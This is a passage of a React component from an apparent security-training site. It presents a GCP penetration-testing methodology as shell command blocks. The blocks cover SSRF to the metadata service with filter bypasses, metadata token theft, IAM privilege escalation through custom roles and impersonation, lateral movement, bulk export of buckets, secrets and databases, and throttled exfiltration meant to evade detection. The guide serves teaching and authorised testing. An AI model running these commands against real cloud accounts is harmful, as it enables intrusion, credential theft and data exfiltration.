                    <h5 className="font-semibold mb-2">Testing Cloud Functions:</h5>
                    <CodeExample 
                      language="bash"
                      title="Cloud Function Testing"
                      code={`# Test if the function is publicly accessible
curl -s https://region-project-id.cloudfunctions.net/function-name

# Test with various parameters
curl -s "https://region-project-id.cloudfunctions.net/function-name?param1=value1&param2=value2"

# Test with POST request
curl -X POST -H "Content-Type: application/json" -d '{"key1":"value1","key2":"value2"}' https://region-project-id.cloudfunctions.net/function-name

# Test with different HTTP methods
curl -X PUT -H "Content-Type: application/json" -d '{"key":"value"}' https://region-project-id.cloudfunctions.net/function-name

# Check for error responses that might leak information
curl -s https://region-project-id.cloudfunctions.net/function-name?error=true`}
                    />
                    
                    <h5 className="font-semibold mb-2">SSRF to Access Metadata Service:</h5>
                    <CodeExample 
                      language="bash"
                      title="SSRF Testing for Metadata Access"
                      code={`# Basic SSRF test against a vulnerable application
curl -s "https://vulnerable-app.example.com/proxy?url=http://metadata.google.internal/computeMetadata/v1/"

# SSRF with the required header
curl -s "https://vulnerable-app.example.com/proxy?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"

# URI encoding to bypass filters
curl -s "https://vulnerable-app.example.com/proxy?url=http%3A%2F%2Fmetadata.google.internal%2Fcomputemetadata%2Fv1%2F"

# IP address representation to bypass filters
curl -s "https://vulnerable-app.example.com/proxy?url=http://169.254.169.254/computeMetadata/v1/"

# Testing for DNS rebinding vulnerabilities
# 1. Set up DNS entry that initially resolves to allowed domain, then switches to metadata.google.internal
# 2. Make request through vulnerable application to your controlled domain`}
                    />
                    
                    <h5 className="font-semibold mb-2">Credential Hunting:</h5>
                    <CodeExample 
                      language="bash"
                      title="Finding Exposed Credentials"
                      code={`# Search GitHub for GCP service account keys
# Look for files with patterns like:
# "private_key": "-----BEGIN PRIVATE KEY-----"
# "type": "service_account"

# Using tools like trufflehog or gitleaks
trufflehog --regex --entropy=False https://github.com/target-org/target-repo

# Search for gcloud configurations or environment variables
# Look for:
# GOOGLE_APPLICATION_CREDENTIALS
# GOOGLE_CLOUD_PROJECT
# application_default_credentials.json

# Testing found credentials
# If you find a service account key (JSON file):
gcloud auth activate-service-account --key-file=found-key.json
gcloud projects list  # See what projects you can access
gcloud config set project PROJECT_ID
gcloud services list  # See what APIs are enabled`}
                    />
                    
                    <h5 className="font-semibold mb-2">Expected Outcomes:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Identified publicly accessible resources</li>
                      <li>Discovered misconfigured services or APIs</li>
                      <li>Potentially valid GCP credentials</li>
                      <li>Understanding of exploitable entry points</li>
                      <li>Possible metadata service access via SSRF</li>
                    </ul>
                  </AccordionContent>
                </AccordionItem>

                <AccordionItem value="item-3">
                  <AccordionTrigger className="text-lg font-medium">3. Privilege Escalation</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      After gaining initial access, this phase focuses on increasing privileges within the GCP environment.
                    </p>
                    <h5 className="font-semibold mb-2">Key Activities:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Enumerate IAM permissions using gcloud</li>
                      <li>Check for overly permissive IAM roles</li>
                      <li>Test for privilege escalation paths</li>
                      <li>Look for custom roles with excessive permissions</li>
                      <li>Test service account token abuse</li>
                      <li>Exploit IAM permission combinations</li>
                    </ul>
                    
                    <h5 className="font-semibold mb-2">IAM Permission Enumeration:</h5>
                    <CodeExample 
                      language="bash"
                      title="IAM Permission Assessment"
                      code={`# Authenticate with found credentials
gcloud auth activate-service-account --key-file=service-account-key.json

# Find out who you are
gcloud auth list
gcloud config list account --format "value(core.account)"

# List projects you have access to
gcloud projects list

# Enumerate your permissions
gcloud projects get-iam-policy PROJECT_ID
gcloud iam service-accounts list --project=PROJECT_ID

# Check specific permissions
gcloud iam list-testable-permissions //cloudresourcemanager.googleapis.com/projects/PROJECT_ID

# Test for specific permissions
gcloud iam test-permissions --permissions=iam.roles.create,iam.roles.update,iam.serviceAccounts.create,iam.serviceAccounts.actAs,resourcemanager.projects.setIamPolicy //cloudresourcemanager.googleapis.com/projects/PROJECT_ID`}
                    />
                    
                    <h5 className="font-semibold mb-2">Common Privilege Escalation Techniques:</h5>
                    <div className="space-y-4 mb-3">
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <h6 className="font-medium mb-1">Technique: Custom Role Creation</h6>
                        <p className="text-sm mb-2">If you have role creation permissions, you can create an admin role:</p>
                        <CodeExample 
                          language="bash"
                          title="Custom Role Privilege Escalation"
                          code={`# Create a YAML file for the privileged role
cat > admin-role.yaml << EOF
title: Custom Admin Role
description: Grants admin access for privilege escalation
stage: GA
includedPermissions:
- iam.serviceAccounts.actAs
- iam.serviceAccounts.create
- iam.serviceAccounts.delete
- iam.serviceAccounts.getIamPolicy
- iam.serviceAccounts.setIamPolicy
- resourcemanager.projects.setIamPolicy
EOF

# Create the custom role
gcloud iam roles create CustomAdminRole --project=PROJECT_ID --file=admin-role.yaml

# Assign the role to yourself
gcloud projects add-iam-policy-binding PROJECT_ID --member=user:your-email@example.com --role=projects/PROJECT_ID/roles/CustomAdminRole
# OR for a service account
gcloud projects add-iam-policy-binding PROJECT_ID --member=serviceAccount:service-account@PROJECT_ID.iam.gserviceaccount.com --role=projects/PROJECT_ID/roles/CustomAdminRole`}
                        />
                      </div>
                      
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <h6 className="font-medium mb-1">Technique: Service Account Impersonation</h6>
                        <p className="text-sm mb-2">Leveraging service account impersonation permissions:</p>
                        <CodeExample 
                          language="bash"
                          title="Service Account Impersonation"
                          code={`# List service accounts you can potentially impersonate
gcloud projects get-iam-policy PROJECT_ID --format=json | jq '.bindings[] | select(.role=="roles/iam.serviceAccountUser" or .role=="roles/iam.serviceAccountTokenCreator")'

# If you have serviceAccountTokenCreator role, generate a token
gcloud iam service-accounts sign-jwt input.jwt output.jwt --iam-account=target-sa@PROJECT_ID.iam.gserviceaccount.com

# Impersonate a service account with gcloud
gcloud config set auth/impersonate_service_account target-sa@PROJECT_ID.iam.gserviceaccount.com

# Run commands as the impersonated service account
gcloud projects list
gcloud iam service-accounts list --project=PROJECT_ID

# Revert back to original account
gcloud config unset auth/impersonate_service_account`}
                        />
                      </div>
                      
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <h6 className="font-medium mb-1">Technique: Compute Instance Metadata</h6>
                        <p className="text-sm mb-2">Using Compute Engine metadata to access service account tokens:</p>
                        <CodeExample 
                          language="bash"
                          title="Metadata Service Token Extraction"
                          code={`# From within a VM or via SSRF vulnerability
# Get access token for default service account
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"

# Get token for specific scopes
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token?scopes=https://www.googleapis.com/auth/cloud-platform" -H "Metadata-Flavor: Google"

# Use the token with API requests
TOKEN=$(curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" | jq -r .access_token)

# Call Google APIs with the token
curl -s -H "Authorization: Bearer $TOKEN" https://cloudresourcemanager.googleapis.com/v1/projects

# Set up gcloud to use this token
gcloud config set auth/access_token_file token.txt
# Where token.txt contains just the token value`}
                        />
                      </div>
                    </div>
                    
                    <h5 className="font-semibold mb-2">Automated Testing Tools:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li><strong>GCP-IAM-Privilege-Escalation</strong> - Scripts for finding GCP privilege escalation paths</li>
                      <li><strong>G-Scout</strong> - Tool for auditing GCP configurations including privilege escalation</li>
                      <li><strong>GCPEnum</strong> - Enumeration tool for GCP resources and permissions</li>
                      <li><strong>Hayat</strong> - GCP security auditing tool</li>
                    </ul>
                  </AccordionContent>
                </AccordionItem>

                <AccordionItem value="item-4">
                  <AccordionTrigger className="text-lg font-medium">4. Lateral Movement</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      This phase involves moving between different GCP projects, services, or organizations after gaining initial access.
                    </p>
                    <h5 className="font-semibold mb-2">Key Activities:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Move between GCP projects using shared IAM roles</li>
                      <li>Exploit trust relationships between resources</li>
                      <li>Use service account impersonation</li>
                      <li>Pivot through VPC peering connections</li>
                      <li>Leverage shared VPC to access other projects</li>
                      <li>Exploit organization-level permissions</li>
                    </ul>
                    
                    <h5 className="font-semibold mb-2">Project-to-Project Movement:</h5>
                    <CodeExample 
                      language="bash"
                      title="Cross-Project Movement"
                      code={`# List all accessible projects
gcloud projects list

# Switch between projects
gcloud config set project NEW_PROJECT_ID

# Check what permissions you have in the new project
gcloud projects get-iam-policy NEW_PROJECT_ID

# List resources in the new project
gcloud compute instances list
gcloud storage ls

# Check for resources you can access across projects
# Example: listing service accounts in all accessible projects
for project in $(gcloud projects list --format="value(projectId)"); do
  echo "Checking service accounts in project: $project"
  gcloud iam service-accounts list --project=$project
done`}
                    />
                    
                    <h5 className="font-semibold mb-2">Using Service Accounts for Movement:</h5>
                    <CodeExample 
                      language="bash"
                      title="Service Account Movement"
                      code={`# If you can create/upload keys for service accounts:
gcloud iam service-accounts keys create key.json --iam-account=SERVICE_ACCOUNT_EMAIL
gcloud auth activate-service-account --key-file=key.json

# If you can impersonate service accounts:
gcloud config set auth/impersonate_service_account SERVICE_ACCOUNT_EMAIL

# Enumerate organization-level access using a privileged service account
gcloud organizations list
gcloud resource-manager folders list --organization=ORGANIZATION_ID

# List organization roles
gcloud organizations get-iam-policy ORGANIZATION_ID

# If you have organization access, list all projects
gcloud projects list --filter="parent.id=ORGANIZATION_ID"`}
                    />
                    
                    <h5 className="font-semibold mb-2">Network-Based Movement:</h5>
                    <CodeExample 
                      language="bash"
                      title="VPC-Based Movement"
                      code={`# Check VPC networks in current project
gcloud compute networks list

# Check for VPC peering connections
gcloud compute networks peerings list

# List shared VPC information
gcloud compute shared-vpc get-host-project TARGET_PROJECT_ID

# If you're in a host project, list service projects
gcloud compute shared-vpc associated-projects list --host-project=HOST_PROJECT_ID

# From a compromised VM, scan internal networks
# Install nmap if needed
sudo apt-get update && sudo apt-get install -y nmap

# Scan the local subnet
nmap -sP $(ip route | grep -v default | cut -d ' ' -f1)

# Scan a peered network range
nmap -sP 10.0.0.0/16  # Replace with the peered VPC CIDR`}
                    />
                    
                    <h5 className="font-semibold mb-2">Organization-Level Movement:</h5>
                    <CodeExample 
                      language="bash"
                      title="Organization Movement"
                      code={`# If you have org-level permissions:
gcloud organizations list

# Get organization IAM policy
gcloud organizations get-iam-policy ORGANIZATION_ID

# List folders in the organization
gcloud resource-manager folders list --organization=ORGANIZATION_ID

# List projects in a folder
gcloud projects list --filter="parent.id=FOLDER_ID AND parent.type=folder"

# Check organization policy constraints
gcloud org-policies list-constraints --organization=ORGANIZATION_ID

# Check specific organization policy
gcloud org-policies describe compute.disableSerialPortAccess --organization=ORGANIZATION_ID

# Create new project in the organization (if allowed)
gcloud projects create new-project-id --organization=ORGANIZATION_ID --name="New Project"`}
                    />
                  </AccordionContent>
                </AccordionItem>

                <AccordionItem value="item-5">
                  <AccordionTrigger className="text-lg font-medium">5. Data Exfiltration Testing</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      This phase tests the ability to extract sensitive data from the GCP environment and evaluates data protection controls.
                    </p>
                    <h5 className="font-semibold mb-2">Key Activities:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Test for unencrypted data in Cloud Storage</li>
                      <li>Check Cloud SQL database access controls</li>
                      <li>Test for sensitive data in Secret Manager</li>
                      <li>Assess Cloud Logging and monitoring bypass techniques</li>
                      <li>Test VPC Service Controls bypass methods</li>
                      <li>Evaluate data loss prevention mechanisms</li>
                    </ul>
                    
                    <h5 className="font-semibold mb-2">Cloud Storage Data Exfiltration:</h5>
                    <CodeExample 
                      language="bash"
                      title="Storage Data Exfiltration"
                      code={`# List all buckets
gsutil ls

# Check for sensitive data in bucket names
gsutil ls | grep -i "backup\|confidential\|secret\|private\|finance\|customer"

# Download entire bucket contents
gsutil -m cp -r gs://target-bucket/* ./exfiltrated-data/

# Search for sensitive patterns in objects
gsutil ls -r gs://target-bucket/** | grep -i "\\.csv$\|\\.xls$\|\\.pdf$\|\\.key$\|\\.pem$"

# Download specific sensitive file types
gsutil -m cp -r "gs://target-bucket/**/*.csv" ./extracted-csv/

# Check for bucket encryption
gsutil kms buckets

# Test if data is actually encrypted at rest
# If you can read the data, check whether the content appears encrypted`}
                    />
                    
                    <h5 className="font-semibold mb-2">Secret Manager Exfiltration:</h5>
                    <CodeExample 
                      language="bash"
                      title="Secret Manager Assessment"
                      code={`# List all secrets
gcloud secrets list

# Access secret values
for secretName in $(gcloud secrets list --format="value(name)"); do
  echo "Extracting secret: $secretName"
  gcloud secrets versions access latest --secret=$secretName > "./extracted-secrets/$secretName.txt"
done

# Check secret IAM permissions
for secretName in $(gcloud secrets list --format="value(name)"); do
  echo "Checking IAM for secret: $secretName"
  gcloud secrets get-iam-policy $secretName
done

# Check for weak permissions on secrets
gcloud secrets list | grep -i "api\|key\|password\|credential\|token"

# Extract all secret versions, not just latest
for secretName in $(gcloud secrets list --format="value(name)"); do
  echo "Secret: $secretName"
  versions=$(gcloud secrets versions list $secretName --format="value(name)")
  for versionNumber in $versions; do
    echo "  Version: $versionNumber"
    gcloud secrets versions access $versionNumber --secret=$secretName > "./extracted-secrets/${secretName}_${versionNumber}.txt"
  done
done`}
                    />
                    
                    <h5 className="font-semibold mb-2">Database Exfiltration:</h5>
                    <CodeExample 
                      language="bash"
                      title="Database Data Exfiltration"
                      code={`# List Cloud SQL instances
gcloud sql instances list

# Export SQL data to Cloud Storage (if sufficient permissions)
gcloud sql export csv INSTANCE_NAME gs://bucket-name/path/export-file.csv \
  --database=DATABASE_NAME --query="SELECT * FROM sensitive_table"

# For BigQuery datasets
# List datasets
bq ls --project_id PROJECT_ID

# List tables in a dataset
bq ls PROJECT_ID:DATASET_NAME

# Extract data from BigQuery to GCS
bq extract --destination_format=CSV 'PROJECT_ID:DATASET_NAME.TABLE_NAME' gs://bucket-name/path/extract.csv

# Download exported data locally
gsutil cp gs://bucket-name/path/extract.csv ./extracted-data/`}
                    />
                    
                    <h5 className="font-semibold mb-2">Bypassing VPC Service Controls:</h5>
                    <CodeExample 
                      language="bash"
                      title="VPC Service Controls Bypass"
                      code={`# Check for VPC Service Controls perimeters
gcloud access-context-manager perimeters list --policy=ACCESS_POLICY_ID

# Check perimeter details
gcloud access-context-manager perimeters describe PERIMETER_NAME --policy=ACCESS_POLICY_ID

# Test for common bypasses:

# 1. Look for authorized identities that can bypass perimeters
gcloud access-context-manager perimeters describe PERIMETER_NAME --policy=ACCESS_POLICY_ID --format=json | jq '.status.accessLevels'

# 2. Check for misconfigured ingress/egress policies
gcloud access-context-manager perimeters describe PERIMETER_NAME --policy=ACCESS_POLICY_ID --format=json | jq '.status.egressPolicies, .status.ingressPolicies'

# 3. Use service account keys from outside the perimeter (if available)
# Authenticate with a service account that has access to resources inside the perimeter
gcloud auth activate-service-account --key-file=service-account-key.json

# 4. Test data export through allowed services
# For example, export BigQuery data through an allowed export path`}
                    />
                    
                    <h5 className="font-semibold mb-2">Evading Detection:</h5>
                    <CodeExample 
                      language="bash"
                      title="Detection Evasion"
                      code={`# Check what logging is enabled
gcloud logging sinks list

# Check for log-based metrics and alerts
gcloud logging metrics list

# Techniques to avoid detection:
# 1. Use gradual/slow data extraction
# 2. Stay within normal usage patterns
# 3. Use allowed export mechanisms
# 4. Operate during business hours when legitimate activity is higher

# Example of throttled data extraction from Storage
# Extract 10 files at a time with random delays between 10-30 seconds
FILES=$(gsutil ls gs://target-bucket/ | head -50)
for file in $FILES; do
  gsutil cp $file ./extracted-data/
  # Sleep for random duration between 10-30 seconds
  sleep $((10 + RANDOM % 20))
done`}
                    />
                  </AccordionContent>
                </AccordionItem>
              </Accordion>
            </div>
          </TabsContent>
          
          <TabsContent value="tools" className="space-y-6 mt-6">
            <div className="card">
              <h3 className="text-2xl font-bold mb-4">Essential GCP Penetration Testing Tools</h3>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h4 className="text-xl font-bold mb-2">GCPBucketBrute</h4>
                  <p className="mb-2">Tool for finding open Cloud Storage buckets in GCP.</p>
                  <div className="bg-cybr-muted/50 p-3 rounded">
                    <h5 className="font-semibold mb-1">Key Features:</h5>
                    <ul className="list-disc list-inside text-sm">
                      <li>Brute force discovery of buckets</li>
                      <li>Permission checking capabilities</li>
                      <li>Content enumeration functionality</li>
                      <li>Customizable search parameters</li>
                    </ul>
                  </div>
                </div>
                
                <div>
                  <h4 className="text-xl font-bold mb-2">Google Cloud SDK (gcloud)</h4>
                  <p className="mb-2">Official command-line interface for Google Cloud Platform.</p>
                  <div className="bg-cybr-muted/50 p-3 rounded">
                    <h5 className="font-semibold mb-1">Key Features:</h5>
                    <ul className="list-disc list-inside text-sm">
                      <li>Complete API access to GCP services</li>
                      <li>Authentication and credential management</li>
                      <li>Scriptable for automated testing</li>
                      <li>Project and organization management</li>
                    </ul>
                  </div>
                </div>
                
                <div>
                  <h4 className="text-xl font-bold mb-2">ScoutSuite</h4>
                  <p className="mb-2">Multi-cloud security auditing tool with GCP support.</p>
                  <div className="bg-cybr-muted/50 p-3 rounded">
                    <h5 className="font-semibold mb-1">Key Features:</h5>
                    <ul className="list-disc list-inside text-sm">
                      <li>Comprehensive GCP service coverage</li>
                      <li>Rules-based assessment approach</li>
                      <li>Web-based reporting dashboard</li>
                      <li>Detailed security findings</li>
                    </ul>
                  </div>
                </div>
                
                <div>
                  <h4 className="text-xl font-bold mb-2">G-Scout</h4>
                  <p className="mb-2">Tool for auditing Google Cloud Platform configurations.</p>
                  <div className="bg-cybr-muted/50 p-3 rounded">
                    <h5 className="font-semibold mb-1">Key Features:</h5>
                    <ul className="list-disc list-inside text-sm">
                      <li>Rules-based security scanning</li>
                      <li>Database of findings for analysis</li>
                      <li>HTML report generation</li>
                      <li>Focus on IAM vulnerabilities</li>
                    </ul>
                  </div>
                </div>
                
                <div>
                  <h4 className="text-xl font-bold mb-2">GCP-IAM-Privilege-Escalation</h4>
                  <p className="mb-2">Scripts and tools for finding GCP privilege escalation paths.</p>
                  <div className="bg-cybr-muted/50 p-3 rounded">
                    <h5 className="font-semibold mb-1">Key Features:</h5>
                    <ul className="list-disc list-inside text-sm">
                      <li>IAM privilege escalation techniques</li>
                      <li>Reference documentation for attacks</li>
                      <li>Example scripts for common scenarios</li>
                      <li>Focus on service account attacks</li>
                    </ul>
                  </div>
                </div>
                
                <div>
                  <h4 className="text-xl font-bold mb-2">GCPEnum</h4>
                  <p className="mb-2">Enumeration tool for GCP resources and services.</p>
                  <div className="bg-cybr-muted/50 p-3 rounded">
                    <h5 className="font-semibold mb-1">Key Features:</h5>
                    <ul className="list-disc list-inside text-sm">
                      <li>Resource discovery across projects</li>
                      <li>Permission verification</li>
                      <li>Output in various formats</li>
                      <li>Comprehensive service coverage</li>
                    </ul>
                  </div>
                </div>
              </div>
            </div>
          </TabsContent>
        </Tabs>
      </div>
    </section>
  );
};

export default GCPSection;
